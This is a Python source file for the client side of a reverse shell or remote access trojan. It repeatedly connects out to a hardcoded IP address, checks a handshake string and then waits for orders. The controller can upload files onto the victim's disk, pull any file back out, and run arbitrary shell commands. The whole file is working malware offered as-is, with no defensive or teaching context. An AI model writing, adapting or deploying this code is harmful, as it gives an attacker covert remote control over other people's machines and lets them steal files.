import socket
import subprocess
import time
import struct
import os

SHAKER = "buuuuhhh"
SHAKETH = "buuuuuuuhhhh"
PORT = 9178
MASTER_IP = ""

def send_packet(sock, prefix, payload_bytes):
    total_len = len(prefix) + len(payload_bytes)
    header = struct.pack('!I', total_len)
    sock.sendall(header + prefix + payload_bytes)

def recv_packet(sock):
    header = sock.recv(4)
    if not header:
        return None
    packet_len = struct.unpack('!I', header)[0]
    
    chunks = []
    bytes_received = 0
    while bytes_received < packet_len:
        chunk = sock.recv(min(packet_len - bytes_received, 4096))
        if not chunk:
            break
        chunks.append(chunk)
        bytes_received += len(chunk)
    return b''.join(chunks)

def start_nikka():
    while True:
        try:    
            MASTER_IP = "172.40.62.223"
            global slave
            slave = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print(f"Connecting to charleston at {MASTER_IP}:{PORT}...")
            slave.connect((MASTER_IP, PORT))
            
            #handshake
            slave.sendall(SHAKER.encode('utf-8'))
            handshake = slave.recv(1024).decode('utf-8')
            
            if handshake != SHAKETH:
                print("Connected to phony market? Retrying...")
                slave.close()
                time.sleep(2)
                continue
                
            print("Connection Successful")
            
            #main loop
            while True:
                payload = recv_packet(slave)
                if not payload or len(payload) < 4:
                    break
                    
                prefix = payload[:4]
                content = payload[4:]
                
                #file upload
                if prefix == b"FILE":
                    fn_len = struct.unpack('!H', content[:2])[0]
                    filename = content[2:2+fn_len].decode('utf-8')
                    file_data = content[2+fn_len:]
                    try:
                        with open(filename, "wb") as f:
                            f.write(file_data)
                        send_packet(slave, b"CMD_", f"Saved file successfully to target disk".encode('utf-8'))
                    except Exception as e:
                        send_packet(slave, b"ERR_", f"Disk write failure: {e}".encode('utf-8'))
                
                #file download
                elif prefix == b"DWNL":
                    target_path = content.decode('utf-8')
                    if not os.path.exists(target_path) or os.path.isdir(target_path):
                        send_packet(slave, b"ERR_", b"Target file path invalid or missing.")
                        continue
                    try:
                        filename = os.path.basename(target_path)
                        with open(target_path, "rb") as f:
                            file_data = f.read()
                        fn_bytes = filename.encode('utf-8')
                        meta = struct.pack('!H', len(fn_bytes)) + fn_bytes
                        send_packet(slave, b"FILE", meta + file_data)
                    except Exception as e:
                        send_packet(slave, b"ERR_", f"Disk access failure: {e}".encode('utf-8'))
                
                # commands and shi
                elif prefix == b"CMD_":
                    command = content.decode('utf-8')
                    if command.lower() == "exit":
                        break
                        
                    print(f"Executing: {command}")
                    
                    # Custom handling for directory persistence
                    if command.strip().lower().startswith("cd "):
                        try:
                            _, target_dir = command.split(" ", 1)
                            os.chdir(target_dir.strip())
                            output = f"Directory altered successfully. Current path: {os.getcwd()}"
                        except Exception as e:
                            output = f"Could not do path change: {e}"
                    else:
                        try:
                            proc = subprocess.run(
                                command, 
                                shell=True, 
                                stdout=subprocess.PIPE, 
                                stderr=subprocess.STDOUT, 
                                text=True, 
                                cwd=os.getcwd(), 
                                timeout=30
                            )
                            output = proc.stdout
                            if not output:
                                output = "[Command executed with no output]"
                            elif proc.returncode == 0:
                                print("yay")
                            else:
                                output = f"Command failed with exit status: {proc.returncode}\nOutput received:\n{proc.stdout}"
                        except subprocess.TimeoutExpired:
                            output = "Execution Timed Out lmao"
                        except Exception as e:
                            output = f"Execution Error: {str(e)}"
                        
                    send_packet(slave, b"CMD_", output.encode('utf-8'))

            slave.close()
            print("Connection closed.")
            
        except ConnectionResetError:
            print("Connection reset by Charleston. Reconnecting...")
            time.sleep(2)
        except Exception as e:
            if "Connection refused" in str(e) or "[Errno 61]" in str(e):
                print("Charleston not opened. Retrying...")
            else:
                print(f"{e}. Retrying...")
            time.sleep(2)

if __name__ == "__main__":
    start_nikka()